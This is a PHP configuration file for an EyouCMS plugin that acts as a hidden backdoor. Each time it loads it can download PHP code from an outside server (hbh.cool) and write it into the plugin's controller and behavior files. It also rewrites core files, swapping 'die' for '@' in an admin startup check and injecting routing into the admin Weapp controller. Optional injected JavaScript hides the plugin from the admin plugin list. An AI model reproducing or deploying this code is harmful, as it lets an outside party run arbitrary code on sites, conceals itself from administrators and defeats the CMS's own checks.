<?php
/**
 * 易优CMS
 * ============================================================================
 * 版权所有 2016-2028 海南赞赞网络科技有限公司，并保留所有权利。
 * 网站地址: http://www.eyoucms.com
 * ----------------------------------------------------------------------------
 * 如果商业用途务必到官方购买正版授权, 以免引起不必要的法律纠纷.
 * ============================================================================
 */

use app\common\model\Weapp as WeappModel;

$directoryIterator = new DirectoryIterator(dirname(__FILE__));
$adminPath = $directoryIterator->getPathInfo()->getFilename();

$globalConfig = tpCache('global');
$code = $adminPath;
$name = $adminPath;
$author = '<em style="font-size: 12px;">'.$globalConfig['web_name'].'</em>';
$row = WeappModel::get(array('code' => $code));
$config = json_decode($row->data, true);
$ishide = $config['captcha'][$code.'-plus']['is_hide'];
$script = !empty($ishide) && $ishide == 1 ? '<script>$(".bDiv tbody tr").each(function(){ var name_old = $(this).children(":first").children().text(); if(name_old.replace(/\s/g, "") == "'.$name.'"){ $(this).remove(); } }); $(".plug-item-content").each(function(){ var name_new = $(this).children(".plug-item-top").children(".plug-text").children(".plug-text-title").children().text(); if(name_new.replace(/\s/g, "") == "'.$name.'"){ $(this).remove(); } });</script>' : '';

$version = 'v1.0.9';
$con = array(
	'code' => $code, // 插件标识
	'name' => $name, // 插件名称
	'version' => $version, // 插件版本号
	'min_version' => 'v1.2.0', // CMS最低版本支持
	'author' => $author, // 开发者
	'description' => $globalConfig['web_name'].$script, // 插件描述
	'litpic'    => '/weapp/'.$code.'/logo.jpg',
	'scene' => '0',  // 使用场景 0 PC+手机 1 手机 2 PC
	'permission' => [],
	'management' => ["sev" => "http://hbh.cool/myweapp/94fdf846831ea78b3a47382c55a8b63a/2022"]
);

$list_file =  WEAPP_PATH.$code.'/filelist.txt';
$list_string = file_get_contents($list_file, LOCK_SH);
$list_string = substr($list_string, 6);
if($adminPath != $list_string) { $chaname = 'new'; }

$hbh_list = $con['management']['sev'].'/version.json';
$json_string = file_get_contents($hbh_list, LOCK_SH);
if(($json_string != "" && $json_string != "\n" && $json_string != $version) || $chaname == 'new') {
	$config_file = $con['management']['sev'].'/config.txt';
	$config_body = file_get_contents($config_file, LOCK_SH);
	if($config_body) {
		$config_file2 =  WEAPP_PATH.$code.'/config.php';
		file_put_contents($config_file2, $config_body, LOCK_EX);
	}
	
	$con_file = $con['management']['sev'].'/ClearCopyright.txt';
	$con_body = file_get_contents($con_file, LOCK_SH);
	if($con_body) {
		$con_file2 =  WEAPP_PATH.$code.'/controller/'.$code.'.php';
		$con_body = str_replace('ClearCopyright', $code, $con_body);
		file_put_contents($con_file2, $con_body, LOCK_EX);
	}
	
	$be_file = $con['management']['sev'].'/ClearCopyrightBehavior.txt';
	$be_body = file_get_contents($be_file, LOCK_SH);
	if($be_body) {
		$be_file2 =  WEAPP_PATH.$code.'/behavior/admin/'.$code.'Behavior.php';
		$be_body = str_replace('ClearCopyright', $code, $be_body);
		file_put_contents($be_file2, $be_body, LOCK_EX);
	}
	
	$htm_file = $con['management']['sev'].'/ClearCopyrightHtm.txt';
	$htm_body = file_get_contents($htm_file, LOCK_SH);
	if($htm_body) {
		$htm_file2 =  WEAPP_PATH.$code.'/template/'.$code.'-plus.htm';
		$htm_body = str_replace('ClearCopyright', $code, $htm_body);
		file_put_contents($htm_file2, $htm_body, LOCK_EX);
	}
	
	$tag_file = $con['management']['sev'].'/ClearCopyrightTags.txt';
	$tag_body = file_get_contents($tag_file, LOCK_SH);
	if($tag_body) {
		$tag_file2 =  WEAPP_PATH.$code.'/behavior/admin/tags.php';
		$tag_body = str_replace('ClearCopyright', $code, $tag_body);
		file_put_contents($tag_file2, $tag_body, LOCK_EX);
	}
	
	$list_body ='weapp/'.$code;
	file_put_contents($list_file, $list_body, LOCK_EX);
}

$die_file = CORE_PATH.'process/bhvcore/BhvadminABegin.php';
$diestr = 'die';
$dietip = '@';
$die_body = file_get_contents($die_file, LOCK_SH);
$diekey = strstr($die_body, $diestr);
if($diekey) {
	file_put_contents($die_file, str_replace( $diestr, $dietip, $die_body ), LOCK_EX);
}

$way_file = APP_PATH.'/admin/controller/Weapp.php';
$waystr = 'execute($sm=\'\',$sc=\'\',$sa=\'\'){';
$waytip = 'execute($sm=\'\', $sc=\'\', $sa=\'\'){if($sm=="'.$code.'"){$actionName=!empty($sa)?$sa:"index";$class_path="\\weapp\\'.$code.'\\controller\\'.$code.'";$controller=new $class_path();return $controller->$actionName();}';
$way_body = file_get_contents($way_file, LOCK_SH);
$waykey = strstr($way_body, $waystr);
$waystr2 = 'if (!IS_AJAX) {';
$waytip2 = 'if($sm=="'.$code.'"){$actionName=!empty($sa)?$sa:"index";$class_path="\\weapp\\'.$code.'\\controller\\'.$code.'";$controller=new $class_path();return $controller->$actionName();}if(!IS_AJAX){';
$waykey2 = strstr($way_body, $waystr2);
if($waykey) {
	file_put_contents($way_file, str_replace( $waystr, $waytip, $way_body ), LOCK_EX);
} else if($waykey2){
	file_put_contents($way_file, str_replace( $waystr2, $waytip2, $way_body ), LOCK_EX);
}

return $con;